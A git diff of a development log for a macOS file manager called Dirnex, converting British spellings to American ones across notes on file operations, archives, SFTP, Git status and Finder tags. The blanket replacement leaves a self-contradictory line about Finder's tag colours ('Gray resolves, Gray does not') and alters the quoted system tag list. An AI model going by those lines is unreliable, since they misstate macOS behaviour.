@@ -375,7 +375,7 @@ come) progress queue. Copy/Move/queue/progress/conflict/undo are the next passes
 - **Core write primitives.** `VFSBackend` grew four write methods —
   `createDirectory` / `moveItem` / `removeItem` / `trashItem` — with default
   implementations that throw `.unsupported`, so a read-only or future backend compiles
-  untouched and the panel greys the op out via `capabilities` (§M5). `LocalBackend`
+  untouched and the panel grays the op out via `capabilities` (§M5). `LocalBackend`
   implements them on POSIX where the errno matters (`mkdir`, `rename`) and `FileManager`
   where it's the right tool (recursive `removeItem`, `trashItem` returning the resulting
   Trash location for a future undo-restore); a `mapCocoaError` helper recovers the POSIX
@@ -558,7 +558,7 @@ non-blocking, window-bottom queue bar instead of the old modal progress sheet (w
 deleted). This is the pass that makes copies TC-style background work.
 
 - **Core** (`FileOperationQueue`): one small addition, `clearFinished()` — drops terminal
-  (finished/cancelled) jobs, leaving waiting/running/paused ones. The aggregate rolls up
+  (finished/canceled) jobs, leaving waiting/running/paused ones. The aggregate rolls up
   *all* known jobs, so without this a later batch would inherit the bytes of jobs already
   done and its bar would start part-full; the app calls it once the queue drains. To stay
   under SwiftLint's `type_body_length` (the addition pushed the actor body to 252 > 250 —
@@ -570,7 +570,7 @@ deleted). This is the pass that makes copies TC-style background work.
   `PanelHost.enqueue(_:conflictPolicy:)` is fire-and-forget; `PanelViewController+Copy`
   keeps the up-front conflict prompt (Overwrite / Keep Both / Skip / Overwrite If Newer /
   Cancel) then hands the operation to the queue and clears its own marks. The window
-  controller drains `queue.observe()` for the window's lifetime (task cancelled in `deinit`;
+  controller drains `queue.observe()` for the window's lifetime (task canceled in `deinit`;
   `[weak self]` + per-iteration re-bind avoids pinning the window alive) and, per snapshot:
   shows/collapses the bar, re-lists **both** panes as each job reaches a terminal state
   (dedup'd via a `finalizedJobs` set), surfaces failures, and `clearFinished()`s on drain.
@@ -588,7 +588,7 @@ deleted). This is the pass that makes copies TC-style background work.
   determinate bar, "1.84 GB of 3.67 GB · 1.27 GB/s · 1s left" — with browsing fully
   responsive, then dest auto-refreshed and the bar collapsed; the file was byte-exact on
   disk. **Pause** froze the transfer at 1.74 GB (identical across a 2 s gap — genuinely
-  parked, not just relabelled), flipped the button to play, and dropped rate/ETA;
+  parked, not just relabeled), flipped the button to play, and dropped rate/ETA;
   **resume** finished it, byte-exact (pause/resume didn't corrupt). The conflict prompt
   also surfaced correctly on a re-copy, showing all five options incl. "Overwrite If Newer".
   (Cancel-all button is core-unit-tested — cancel-waiting/cancel-running — and renders; not
@@ -992,7 +992,7 @@ the visited-directory list; all three hang off the same command registry as pass
   decomposition pass, like `+Table`/`+Chrome` before it.)
 - **Verified live via computer-use** (no overlay this session — mouse + keyboard both worked;
   navigated the real tree through a `~/history-verify/alpha/x` fixture): the Go menu showed
-  Back ⌘[ / Forward ⌘] **greyed at a fresh single-entry history** and Directory History… ⌥↓
+  Back ⌘[ / Forward ⌘] **grayed at a fresh single-entry history** and Directory History… ⌥↓
   enabled; navigating oleg→history-verify→alpha→x then **⌘[** stepped x→alpha→history-verify
   and **⌘]** returned →alpha (keyboard equivalents fire through the responder chain); **⌥↓**
   dropped the popup listing x / ✓alpha / history-verify / oleg (newest-first, current
@@ -1213,7 +1213,7 @@ custom selectors** — while a rename or path field editor is first responder it
 ordinary *text* copy/paste, and only when the file table is first responder do they reach the pane
 as a file op. (The first cut used custom selectors gated off in text fields, which left ⌘C/⌘V dead
 *inside* text fields, since no `copy:`/`paste:` menu item existed to route them; the standard
-selectors fixed that and removed the greyed-menu wart.) ⌥⌘V has no standard selector, so it stays
+selectors fixed that and removed the grayed-menu wart.) ⌥⌘V has no standard selector, so it stays
 custom and *is* gated off in text fields, or it would move a file mid-rename. Same-directory
 "copy": the `.ask` resolver auto-returns `.keepBoth` when `context.source.path ==
 context.existing.path`, so pasting into an item's own folder produces "<name> copy" with no prompt,
@@ -1379,11 +1379,11 @@ moved the virtual-label builder to an extension. Repo swiftformat/swiftlint-stri
 pre-existing `redundantSelf` nit in the untouched `BrowserWindowController`); app `xcodebuild build`
 + `swift test` + app smoke test green. VERIFIED LIVE (mouse+menu-driven, no overlay; fully quit the
 stale instance first per the recurring gotcha, and confirmed the fresh debug dylib carried the new
-strings): Go ▸ **Find Files… ⌥F7** opened the sheet (Find greyed until "network-usage-2026-05" was
+strings): Go ▸ **Find Files… ⌥F7** opened the sheet (Find grayed until "network-usage-2026-05" was
 typed, then blue); Find opened a new left-pane tab **"network-usage-2026-05"** with path bar
 **🔍 Results for "network-usage-2026-05"**, the **3** matching JSONs (byte-exact against the 3 in
 the right Downloads pane), **3 items** status, and **no `..` row**; the File menu showed **Copy/Move
-to Other Panel enabled** while **Rename/Multi-Rename/New Folder/Trash/Delete were all greyed**; and
+to Other Panel enabled** while **Rename/Multi-Rename/New Folder/Trash/Delete were all grayed**; and
 closing the results tab (its ✕) restored the browsing `oleg` tab (breadcrumbs + `..` + 18 items, tab
 bar re-hidden). Left the app on Home. GOTCHA (design): a virtual panel is the cleanest place the VFS
 `.search` backend id + a per-site `isSearchResults` guard pays off — the alternative (a per-tab
@@ -1442,7 +1442,7 @@ takes one backend for source *and* dest — a cross-backend archive→local copy
   (folders, dash size) + `alpha.txt` 14 B + `release notes.txt` 13 B (**space preserved**), a `..` row, and
   "4 items" (`..` excluded); into `docs` → `api` + `readme.md` 16 B; into `docs/api` → `reference.md` 17 B,
   path bar **📦 pkg.zip ▸ docs ▸ api**; the File menu there showed **Copy/Move to Other Panel, Rename,
-  Multi-Rename, New Folder, Move to Trash, Delete Immediately ALL greyed** (only New Tab/Close Tab live);
+  Multi-Rename, New Folder, Move to Trash, Delete Immediately ALL grayed** (only New Tab/Close Tab live);
   `..` walked `api → docs → root` each landing the cursor on the branch we came from, and one more `..` at
   the root **exited to `~/DirnexArchiveTest` with clickable local breadcrumbs restored and the cursor on
   `pkg.zip`**; `bundle.tgz` browsed identically (tar's `./` prefix stripped, no phantom root entry). GOTCHA
@@ -1492,7 +1492,7 @@ local files, reusing every bit of its conflict / progress / undo machinery for f
   Both / Skip / Replace-If-Newer, "apply to all", queue bar) — proving it flows through the normal queue —
   and Keep Both produced `a file with spaces copy.txt`. A nested `docs/api/reference.md` F5'd from inside the
   subfolder landed **flat** as `reference.md` (the `entry.name` behavior). The File menu inside the archive
-  showed **Copy to Other Panel enabled, Move + all mutations greyed**. Launch-purge confirmed: 3 temp dirs
+  showed **Copy to Other Panel enabled, Move + all mutations grayed**. Launch-purge confirmed: 3 temp dirs
   accumulated, survived quit, and were gone after relaunch. GOTCHA (bsdtar): members are glob *patterns*, not
   literals — must escape `\ * ? [`, and `extractedLocation` uses the *raw* (unescaped) name since the on-disk
   file keeps its real name. GOTCHA (architecture): temp-extract-then-normal-copy is the clean cross-backend
@@ -1644,7 +1644,7 @@ notes.txt`) deletes exactly, and the pane re-lists the rewritten archive in plac
   App `xcodebuild build` green, new methods confirmed in the debug **dylib**.
 - **Verified live via computer-use** (fresh Debug build after a full quit): File menu inside an archive
   showed **Move to Trash / Delete Immediately… enabled** with Move/Pack/Rename/Multi-Rename/New Folder
-  still greyed. In `pkg.zip` marked a dir (`docs`) + a spaced name + `weird[1].txt` → "Delete 3 items
+  still grayed. In `pkg.zip` marked a dir (`docs`) + a spaced name + `weird[1].txt` → "Delete 3 items
   from “pkg.zip”?" → on-disk the three gone, `images`/`alpha.txt`/`readme.txt` byte-exact, archive VALID,
   **zero `.dirnex-rewrite-*` litter**, scratch dir cleaned. The **over-match safety case** (`dup.zip` with
   `a/notes.txt` AND `b/notes.txt`): deleting `a/notes.txt` (⌘⌦, single-item confirm) left `b/notes.txt`
@@ -1744,7 +1744,7 @@ through nesting is a later item), matching the app's capability-degradation patt
   `outer2.zip ▸ sub ▸ mid.zip ▸ inner.zip` browsed all four levels (full breadcrumb) and `..` from
   `inner.zip` landed at `mid.zip` root onto `inner.zip`. The File menu inside a nested archive showed
   **Copy to Other Panel enabled** but **Move to Trash / Delete Immediately / Pack / Rename / New Folder
-  greyed** (read-only). **F5 copy-out** of `mid-note.txt` from the doubly-nested `mid.zip` landed
+  grayed** (read-only). **F5 copy-out** of `mid-note.txt` from the doubly-nested `mid.zip` landed
   byte-exact ("MID level") on real disk. Zero `.dirnex-rewrite-*` litter (reads never rewrite); the
   only temp is `DirnexExtract/` (purged at launch, like previews and F5). Fixtures deleted; app left on
   Home. NEXT M4: saved searches as places-strip virtual folders, deferred search niceties (tag chip,
@@ -1785,7 +1785,7 @@ a saved search is just that query + a name + a scope, persisted.
   App `xcodebuild build` green; new code confirmed in `Dirnex.debug.dylib`; touched files
   swiftformat/swiftlint-strict clean.
 - **Verified live via computer-use** (fresh Debug build after a full quit; no overlay this session):
-  Go ▸ **Save Search…** was greyed on a normal pane, enabled after a ⌥F7 "jmeter" search (3 hits) —
+  Go ▸ **Save Search…** was grayed on a normal pane, enabled after a ⌥F7 "jmeter" search (3 hits) —
   the prompt prefilled the unquoted default **"jmeter"**, saved as "JMeter Stuff" → appeared under a
   new **Searches** header with a magnifier icon (sidebar rebuilt live). Clicking it re-ran into a
   fresh `*jmeter*` results tab (same 3 hits). Right-click → **Run / Rename… / Delete**: Rename →
@@ -1845,7 +1845,7 @@ a saved search is just that query + a name + a scope, persisted.
       mid-file resume** all DONE and verified live (via the system `sftp` CLI, not
       swift-nio-ssh/libssh2 — the same sidestep M4 made with `bsdtar`). Copy-out (`get`) / copy-in
       (`put`), remote mkdir / rename / recursive-delete all run through the standard queue; an SFTP
-      pane is writable (`[.read, .write, .rename]`) so the pass-5 grey-out + Trash-less
+      pane is writable (`[.read, .write, .rename]`) so the pass-5 gray-out + Trash-less
       confirmed-permanent-delete light up. **Password auth** (pass 9) via `SSH_ASKPASS` (no PTY
       needed) + Keychain storage. **Mid-file resume** (pass 10) — `copyFile` picks up a partial
       destination via `get -a`/`put -a` instead of restarting; verified live against a real server
@@ -1863,7 +1863,7 @@ a saved search is just that query + a name + a scope, persisted.
       `ServerConnectionStore` + a **Servers** sidebar section (mirrors **Searches**), plus a
       generalized Connect-to-Server prompt (protocol picker SFTP | SMB + Save). Subsumes the deferred
       "saved SFTP connections in the sidebar" item
-- [x] Capability degradation: panels grey out unsupported ops per backend ✅ (per-path
+- [x] Capability degradation: panels gray out unsupported ops per backend ✅ (per-path
       `capabilities(for:)`; no Trash → explicit permanent-delete confirm ✅; no clone →
       always chunked ✅) — driven off the owning backend's caps, ready for SFTP to plug into
 - [x] Synchronize directories: two-panel diff view (left-only / right-only / differs /
@@ -2076,7 +2076,7 @@ capability test double stands in). Pieces:
   panel.path).contains(.write/.rename)` (drops the `!isVirtualDirectory` prefix — a virtual pane
   already reports `.read`, and this is correct for a future writable-non-local SFTP where
   `isVirtualDirectory` would wrongly fire). `deleteSelection`/`validateMutatingItem` now branch on
-  `capabilities(for:).deleteStrategy`: `.unsupported` → no-op/greyed, `.trash` on F8 → Trash (with the
+  `capabilities(for:).deleteStrategy`: `.unsupported` → no-op/grayed, `.trash` on F8 → Trash (with the
   existing optional confirm), else (Shift+F8, or F8 on a Trash-less backend) → the confirmed
   permanent-delete path. The **top-level-archive rewrite delete** (`isWritableArchive` →
   `beginArchiveDelete`) still short-circuits *first* — archive writes are the app's separate
@@ -2085,13 +2085,13 @@ capability test double stands in). Pieces:
   refactored speculatively). New app test `DirnexTests/CompositeBackendTests.swift` (+3 → **7 app
   tests**) asserts the crux: local path = full caps (`deleteStrategy == .trash`), archive + search
   paths = `.read` (`deleteStrategy == .unsupported`). Behavior on today's backends is **identical by
-  construction** (traced each branch: local delete = Trash, archive/search delete greyed, New
-  Folder/rename greyed on virtual) — the change is degradation *infrastructure* + a behavior-
+  construction** (traced each branch: local delete = Trash, archive/search delete grayed, New
+  Folder/rename grayed on virtual) — the change is degradation *infrastructure* + a behavior-
   preserving refactor, so the visible payoff arrives with SFTP. `swift test` (390) + app
   `xcodebuild test` (7) green, swiftformat/swiftlint-strict clean, app launches + quits cleanly.
   **NEXT M5 (last item):** the `SFTPBackend` infra gate (swift-nio-ssh/libssh2 dependency + a live/
   dockerized SSH server to test against) — with per-path capabilities + `DeleteStrategy` now in
-  place, an SFTP pane's grey-out and Trash-less delete-confirm work the moment the backend reports
+  place, an SFTP pane's gray-out and Trash-less delete-confirm work the moment the backend reports
   `[.read, .write, .rename]` (no `.trash`/`.clone`). Optional polish: Settings picker for the
   preferred diff tool.
 
@@ -2142,7 +2142,7 @@ UTC, or the day shifts. **NEXT M5 (finishes the item):** the app-layer live tran
 `Process`-driven `ssh`/`sftp` runner (mirroring `ArchiveMounter`/`SpotlightSearchRunner`), a
 connection manager + Keychain credential storage + key auth, composite-backend routing on `isSFTP`,
 and the **write pass** (mkdir/move/remove + byte `copyFile` with resume, flipping caps to
-`[.read, .write, .rename]` → the pass-5 grey-out + Trash-less permanent-delete confirm go live). That
+`[.read, .write, .rename]` → the pass-5 gray-out + Trash-less permanent-delete confirm go live). That
 tail is the genuine infra gate: it needs a live/dockerized SSH server (or local Remote Login) +
 credentials to verify against — which I can't provision here, so it awaits that setup. Optional
 polish still open: Settings picker for the preferred diff tool.
@@ -2191,7 +2191,7 @@ swiftformat/swiftlint-strict clean. SPOTTED FOLLOW-UP (out of scope, pre-existin
 shares the same no-year→2000 date bug for recent archive members — worth the same `defaultDate = now`
 fix. **NEXT M5 (finishes `SFTPBackend`):** the write pass — `SFTPProcessTransport` gains
 mkdir/rename/remove + `copyFile` (download via `sftp get`, upload via `put`) with progress/resume,
-flipping SFTP caps to `[.read, .write, .rename]` so the pass-5 grey-out + Trash-less permanent-delete
+flipping SFTP caps to `[.read, .write, .rename]` so the pass-5 gray-out + Trash-less permanent-delete
 confirm light up; then password/Keychain auth (needs a PTY). Optional polish: an SSH ControlMaster so
 repeated listings reuse one connection instead of re-handshaking per directory; saved connections in
 the sidebar; Settings picker for the preferred diff tool.
@@ -2216,13 +2216,13 @@ size → `get` download → byte-compare → recursive remove) passed through th
   of the path (`sftp`'s `ls` *follows* a symlink, so statting a link-to-dir would delete the
   *target's* contents — a parent listing shows the link as a link, so `rm` removes the link alone);
   `copyFile` = **download** (`id` source → `.local` dest, `get`) or **upload** (`.local` source →
-  `id` dest, `put`), reporting the transferred bytes once for the progress bar and honouring
+  `id` dest, `put`), reporting the transferred bytes once for the progress bar and honoring
   `isCancelled` at the file boundary, refusing an unexpressible remote↔remote copy. The fake
   transport now records every write call so the recursion/routing is asserted without a server.
 - **App**: `SFTPProcessTransport` spawns each verb as one `sftp` batch command (reusing the pass-7
   `run(batch:)`), transfers returning the local file's size for progress. `CompositeBackend` routes
   `capabilities(for:)` to a **connected** SFTP backend (`[.read, .write, .rename]`; an unconnected /
-  dropped SFTP path falls back to `.read` so writes grey out rather than fail), routes `copyFile` on
+  dropped SFTP path falls back to `.read` so writes gray out rather than fail), routes `copyFile` on
   the **destination** when it is remote (so an upload reaches the SFTP `put`; a download/local-local
   still routes on the source), and throws `EXDEV` for any cross-backend move. Reconciled
   `isVirtualDirectory` → **`isArchive || isSearchResults`** (an SFTP dir is a *real* writable remote
@@ -2276,7 +2276,7 @@ fail fast). Core→app as always:
   holds the channel open — the live test server does exactly that, so a real connect there takes the
   full timeout but succeeds). `SFTPKeychain` (Security framework) stores/loads/deletes the password
   keyed by `keychainAccount`; `SFTPConnectPrompt` gained a Private-Key/Password segmented control + an
-  `NSSecureTextField` (irrelevant field greys out); `connectToServer` stores the password to the
+  `NSSecureTextField` (irrelevant field grays out); `connectToServer` stores the password to the
   Keychain **only after** the probe authenticates (so a typo isn't cached); `CompositeBackend.connectSFTP`
   + the live/app-test call sites thread `authentication`/`password`. +1 app test (askpass helper is
   executable) + a self-gated **localhost wrong-password** live test (real transport → `.permissionDenied`
@@ -2391,7 +2391,7 @@ Nothing built yet — this is the scoped design; core-first as always (`ServerCo
 then `SMBMounter` / store / sidebar / prompt), verified live against a LAN SMB share.
 
 Progress (2026-07-14, M5 SMB pass 1 — the pure core): the tested, headless value types landed, the
-same core-first opener every M5 slice used. Two new `DirnexCore` files, no behavioural change to any
+same core-first opener every M5 slice used. Two new `DirnexCore` files, no behavioral change to any
 existing type (one additive conformance):
 - **`VFS/SMBLocation.swift`** — the SMB analogue of `SFTPLocation`: `host` / `share?` / `username?` /
   `port` (default 445), *without* a secret. Deliberately **not** a `VFSBackendID` address — SMB rides
@@ -2527,7 +2527,7 @@ needs no rebuild). Method note: `git`'s real output was **probed live before any
 (the pass-7 lesson — `SFTPListingParser` had to be reworked because its format was assumed, not
 observed), which caught three things a from-memory parser gets wrong:
 - **`GitStatus.swift`** — `GitFileStatus` (`unmodified/modified/added/deleted/renamed/untracked/
-  ignored/conflicted`, each with Git's own one-letter `code` — the app picks the colour, this picks
+  ignored/conflicted`, each with Git's own one-letter `code` — the app picks the color, this picks
   the character) + `GitStatusEntry` (one porcelain record: `relativePath` + **both** of Git's axes,
   `indexStatus`/`worktreeStatus`, kept verbatim so a later tooltip can say "staged edit plus unstaged
   edits on top" without re-parsing) + `GitBranch` (name/upstream/ahead/behind/isDetached/
@@ -2633,7 +2633,7 @@ change at all (pass 1's 544 tests stand untouched):
   that has nothing to do with them. Name is the right column to charge because it is already the one
   that absorbs slack (`firstColumnOnlyAutoresizingStyle`); a filename with less room is a truncation,
   not a rearranged pane. (The alternative — drawing the status inside the name cell, VS Code-style —
-  was rejected: text colour there is already taken by the mark's bold red and the hidden-file dim,
+  was rejected: text color there is already taken by the mark's bold red and the hidden-file dim,
   and inline rename (F2) replaces that cell's text field with an editable box a badge would have to
   dodge. It would reserve the same 20 pt anyway.) **GOTCHA, and the reason the first fix still
   drifted ~17 pt: `intercellSpacing.width` is 17 pt at this table's `.plain` style, not the 2–3 pt
@@ -2649,7 +2649,7 @@ change at all (pass 1's 544 tests stand untouched):
   repository. `applyColumnLayout` lifts the gutter out before the reorder pass and re-installs after:
   that pass moves each stored column to its target index in turn, which drags an unlisted column to
   the far end one move at a time.
-  `FileCellView.accentColor` carries the status colour — it outranks the mark's red (a marked
+  `FileCellView.accentColor` carries the status color — it outranks the mark's red (a marked
   modified file still shows an orange `M`) and yields to the cursor's emphasized background.
 - **BUG the user caught, and the reason the pane has `renderRefresh` at all:** the snapshot-arrived
   path hand-rolled `tableView.reloadData()`, which drops the table's selection — so **crossing a
@@ -2710,36 +2710,36 @@ additive field on `SpotlightQuery`.** Method note, and it paid for itself repeat
 format was probed against real tagged files before any Swift was written** (the pass-1 `git` lesson,
 and the pass-7 `SFTPListingParser` rework that came of *assuming* a format). Every claim below was
 observed, and the first draft of nearly all of them would have been wrong:
-- **`FinderTag.swift`** — `FinderTagColor` (the 8 indices) + `FinderTag` (name + colour, parse/
+- **`FinderTag.swift`** — `FinderTagColor` (the 8 indices) + `FinderTag` (name + color, parse/
   serialize) + `FinderTagPayload` (the attribute's binary-plist array). The format is
-  `com.apple.metadata:_kMDItemUserTags` = a **binary plist array of `name\ncolourIndex` strings**.
-  Traps found by probing: **(a) the colour indices are not Finder's display order** — `FavoriteTagNames`
-  reads Red, Orange, Yellow, Green, Blue, Purple, Grey, which looks like the enumeration and is not
-  it; the real mapping (0 none · 1 Grey · 2 Green · 3 Purple · 4 Blue · 5 Yellow · 6 Red · 7 Orange)
-  was established by letting the system assign each colour itself from a bare name. `Grey` resolves,
+  `com.apple.metadata:_kMDItemUserTags` = a **binary plist array of `name\ncolorIndex` strings**.
+  Traps found by probing: **(a) the color indices are not Finder's display order** — `FavoriteTagNames`
+  reads Red, Orange, Yellow, Green, Blue, Purple, Gray, which looks like the enumeration and is not
+  it; the real mapping (0 none · 1 Gray · 2 Green · 3 Purple · 4 Blue · 5 Yellow · 6 Red · 7 Orange)
+  was established by letting the system assign each color itself from a bare name. `Gray` resolves,
   `Gray` does not. **(b) A third field exists in the wild**: passing an already-suffixed `Red\n6` to
   `URLResourceValues.tagNames` makes the system treat the *whole string* as the name and append its
   own lookup, storing `Red\n6\n0` — my own first probe wrote corrupt tags this way and they looked
-  right. The system reads such rows back as plain `Red`, so fields past the colour are ignored here
-  too. **(c) The colour field is optional** (a bare `Plainname` round-trips), and the system always
+  right. The system reads such rows back as plain `Red`, so fields past the color are ignored here
+  too. **(c) The color field is optional** (a bare `Plainname` round-trips), and the system always
   *emits* it, `\n0` included — so we emit what it emits. Identity is the **name, case-insensitively**,
   which is the system's own rule (writing `red` stores `red` but resolves to Red's 6), and matches the
   `SavedSearch`/`ServerConnection` name-as-identity precedent. Malformed rows are skipped and a
-  nonsense colour degrades to `.none` rather than dropping the tag — the `GitStatusParser` call: one
+  nonsense color degrades to `.none` rather than dropping the tag — the `GitStatusParser` call: one
   bad row must not blank the cell. Duplicates collapse (the system does **not** dedupe on write).
 - **`FinderTagStorage.swift`** — the local xattr read/write, in core beside `ByteComparator` per §2.
   **Why it writes the attribute by hand rather than calling `URLResourceValues.tagNames`, the
   documented API — two independent reasons, either sufficient: (1) its setter is macOS 26+ and
-  Dirnex targets 14** (caught by the compiler, not by me); **(2) it cannot express a colour** — it
+  Dirnex targets 14** (caught by the compiler, not by me); **(2) it cannot express a color** — it
   takes bare names and looks each up in a global database that a write of ours never registers into,
-  so expressing an edit through it strips the colour off every custom tag on the file (probed: after
+  so expressing an edit through it strips the color off every custom tag on the file (probed: after
   storing a purple `Zebra`, `tagNames = ["Zebra"]` writes `Zebra\n0`). A data-loss bug wearing the
-  documented API's clothes. The getter is available on 14 but drops colours, so it is no use for a
+  documented API's clothes. The getter is available on 14 but drops colors, so it is no use for a
   column either. The one thing the API does that we then must do ourselves is **keep the legacy
   `com.apple.FinderInfo` label byte in sync** — probed: `tagNames = ["Red"]` leaves Spotlight
   reporting `kMDItemFSLabel = 6` where a raw write leaves 0, and the selection rule is **the last
-  *coloured* tag wins** (`[Green, Red]`→6, `[Red, Orange]`→7, `[Zebra, Blue]`→4 skipping the
-  colourless) — not first, not lowest. Read-modify-write, since the other 31 bytes are type/creator
+  *colored* tag wins** (`[Green, Red]`→6, `[Red, Orange]`→7, `[Zebra, Blue]`→4 skipping the
+  colorless) — not first, not lowest. Read-modify-write, since the other 31 bytes are type/creator
   codes belonging to whoever wrote them.
 - **`SpotlightQuery.tags`** — the chip's pure half; the file's own header comment had anticipated it
   since M4. One `kMDItemUserTags == "Name"c` clause **per tag, ANDed** (kinds OR because a second kind
@@ -2757,19 +2757,19 @@ exact bytes macOS wrote** for a real tagged file. `swift test` green, swiftforma
 clean; app target untouched (new files + one additive field, so no rebuild needed).
 **VERIFIED LIVE** — a harness compiled against the real core wrote tags into a real folder, then
 **Finder itself** was the judge: the stock `Red` painted a red dot, a custom **purple `Zebra` + `Blue`
-rendered as Finder's two-tone split dot**, a colourless `Work` correctly drew **no** dot and left no
+rendered as Finder's two-tone split dot**, a colorless `Work` correctly drew **no** dot and left no
 FinderInfo record, an incremental add+remove (case-insensitive) preserved the custom purple, Get Info
 listed the names, `kMDItemFSLabel` read **6** where a naive raw write leaves 0, and **Spotlight
 indexed our tags** — the exact predicate `SpotlightQuery` builds, run verbatim through `mdfind`,
 found the file (the search chip, end-to-end). All artifacts removed after.
 **FINDING that shapes pass 4, and the reason to look rather than assume:** mid-verification Finder
-**silently rewrote our bytes on disk**, `Zebra\n3` → `Zebra`, stripping a colour. It is not
-reproducible on demand and a brand-new name (`Quokka\n7`) is adopted, honoured, and rendered orange
-in both the dot and the Get Info chip. The consistent explanation: **a colour belongs to the *name*,
-system-wide, not to the file** — the system's name → colour database is authoritative, and Finder
+**silently rewrote our bytes on disk**, `Zebra\n3` → `Zebra`, stripping a color. It is not
+reproducible on demand and a brand-new name (`Quokka\n7`) is adopted, honored, and rendered orange
+in both the dot and the Get Info chip. The consistent explanation: **a color belongs to the *name*,
+system-wide, not to the file** — the system's name → color database is authoritative, and Finder
 reconciles a file's stored copy against it, so `Zebra`, which my own earlier probes had registered as
-colourless, got normalized back. Recorded in `FinderTag`'s doc comment: an editor may offer a colour
-when *introducing* a tag, but must not present per-file colour as the user's to own — re-colouring
+colorless, got normalized back. Recorded in `FinderTag`'s doc comment: an editor may offer a color
+when *introducing* a tag, but must not present per-file color as the user's to own — re-coloring
 one file's `Work` is not a change macOS keeps. (Exact trigger not pinned down; it is Finder's
 business, and the engineering conclusion holds either way.)
 **NEXT (M6 pass 4, the app layer):** a `FinderTagProvider` mirroring `GitStatusProvider` (off-main,
@@ -2789,7 +2789,7 @@ gutter's contextual rule. The rule was tempting (it is right there, tested, one 
 property of a whole subtree, so the gutter appears once on the way in and stays; tagged files are
 **scattered**, so the identical rule would install and remove the column — and re-truncate every
 filename, since a gutter is paid for out of Name — on nearly every step between sibling folders. A
-precedent is an argument, not a licence. The preference is still ANDed with "could these rows carry
+precedent is an argument, not a license. The preference is still ANDed with "could these rows carry
 tags at all" (local files, and search hits, which are local files in a virtual pane): inside an
 archive or on SFTP the column could only ever be blank, which is what the preference exists to avoid.
 The checkmark tracks the *preference*, never that derived state — unchecking the box inside a zip
@@ -2813,27 +2813,27 @@ would blame the user's setting for the filesystem's limits.
   for "the user's tags"; the system's list is Finder's own synced plist, not a contract) and feeds
   both the editor menu and the search completion — verified live: `Urgent`, met in one tab, was
   offered in another. **`FinderTagSnapshot.==` is hand-rolled and must be**: `FinderTag`'s own `==`
-  compares names case-insensitively and **ignores colour** — correct for identity, wrong for "did the
-  pixels change" — so the synthesized version would answer "equal" when Finder recoloured a tag (which
+  compares names case-insensitively and **ignores color** — correct for identity, wrong for "did the
+  pixels change" — so the synthesized version would answer "equal" when Finder recolored a tag (which
   pass 3 documented it doing *by itself*) and the column would keep painting the old dot.
 - **`PanelViewController+Tags.swift`** — per-tab snapshot, install, row lookup. **No watcher of its
   own, unlike Git**: the Git side had to watch the *repository root* because `git add` in a terminal
   changes what rows say while touching nothing under the visible folder; a tag has no elsewhere — it
   is an attribute **on the file** — so the pane's existing directory watcher already fires for it.
   Verified live (a new file appeared and rescanned with the rest).
-- **`TagCellView.swift`** — custom-drawn dots; the content *is* the colour, so it borrows neither
-  `FileCellView`'s text field nor the Git letter's `accentColor`. Two judgement calls: a **colourless
+- **`TagCellView.swift`** — custom-drawn dots; the content *is* the color, so it borrows neither
+  `FileCellView`'s text field nor the Git letter's `accentColor`. Two judgment calls: a **colorless
   tag draws a hollow ring** where Finder draws nothing — Finder can afford that because its dots sit
-  beside the name, so absence reads as "no colour", whereas in a column of its own it would read
+  beside the name, so absence reads as "no color", whereas in a column of its own it would read
   "untagged", a lie about a file the user did tag; and on the cursor's emphasized row every dot is
-  **ringed in the selection's text colour**, or a blue tag vanishes into blue.
+  **ringed in the selection's text color**, or a blue tag vanishes into blue.
 - **`PanelViewController+TagEditing.swift`** — ⌃T (free; ⌘T is New Tab, and ⌃D/⌃Q are where this app's
   popups already live) drops a menu over the cursor row: stock seven + names in use, `.on`/`.mixed`
   per how many targets carry each, toggle across the selection, New Tag…, Remove All Tags. Targets are
   filtered **per entry** (`.local`), not per pane — which is what lets tagging work from a search
-  results tab, and makes a mixed selection tag what it can. **The menu offers a colour only when
-  *introducing* a name**, per pass 3's finding that colour belongs to the name system-wide: offering
-  per-file colour would be offering an edit macOS silently reverts.
+  results tab, and makes a mixed selection tag what it can. **The menu offers a color only when
+  *introducing* a name**, per pass 3's finding that color belongs to the name system-wide: offering
+  per-file color would be offering an edit macOS silently reverts.
 - **Search chips** — an `NSTokenField` (a tag *is* a token; it rounds each name into a deletable chip
   and completes against `knownTagNames`). Read via **`stringValue`, not `objectValue`**: the latter
   holds only *tokenized* chips, so a tag typed without a trailing comma would not merely be dropped
@@ -2852,13 +2852,13 @@ table is a renderer; the model is the truth.*
 were tagged by **Apple's own writer** (`URLResourceValues.tagNames`, available on this macOS 26 box
 though not on Dirnex's 14 floor) and our writes were read back through **Apple's own getter**, which
 saw exactly what we wrote. Confirmed: every dot case (stock, multi, 3-dot cap from five, hollow ring
-for a colourless `Quokka`, nothing for untagged, white ring on the cursor row); a tag added from the
-menu landing on disk as `Green\n2` with **`kMDItemFSLabel = 2`** — the last-*coloured*-tag-wins rule
+for a colorless `Quokka`, nothing for untagged, white ring on the cursor row); a tag added from the
+menu landing on disk as `Green\n2` with **`kMDItemFSLabel = 2`** — the last-*colored*-tag-wins rule
 pass 3 documented, maintained by our hand-written label; a purple `Milestone` across a 6-file marked
 set **preserving the existing `Quokka\n0` verbatim** (the exact data loss `tagNames` would have
 caused, which is why the core writes by hand); the mixed `−` state; completion offering a custom name
 learned by browsing; the chip narrowing `mdfind` to the one file carrying `Urgent`; **dots in the
-results panel and ⌃T working there**; the column vanishing inside a zip with ⌃T greyed out; the
+results panel and ⌃T working there**; the column vanishing inside a zip with ⌃T grayed out; the
 toggle taking both panes live; and **both gutters coexisting in the Dirnex repo itself** (Name │ `M`/`!`
 │ dots │ Size │ Date). The layout invariant was checked in the persisted store, not by eye: after
 repeated toggles and tab switches Name stayed **exactly 279.5** and no `tags` entry ever entered a
@@ -2873,7 +2873,7 @@ context menu the app had never had. Both done, VERIFIED LIVE.
 
 **The column is gone; the dots ride at the right edge of the name.** This is the better design and the
 user was right to ask for it, but note what it retires: the whole preference question pass 4 agonized
-over (contextual vs always-on vs a toggle) was an artefact of the dots *being a column* — a column
+over (contextual vs always-on vs a toggle) was an artifact of the dots *being a column* — a column
 must be present or absent for the whole pane, so it had to be blank for non-taggers or jitter. Inside
 the name cell the question dissolves: an untagged row draws nothing and gives its name the full width,
 so tags cost exactly the rows that have them. `showTags` survives as a plain on/off (the dots are
@@ -2882,7 +2882,7 @@ but the elaborate justification is gone with the column. **Pass 4's generalizati
 column machinery went with it** — it existed only to host a second gutter, so `+ContextualColumns` was
 deleted and `+Git`/`+Columns` restored verbatim from 42e88f2. A generalization with one client is just
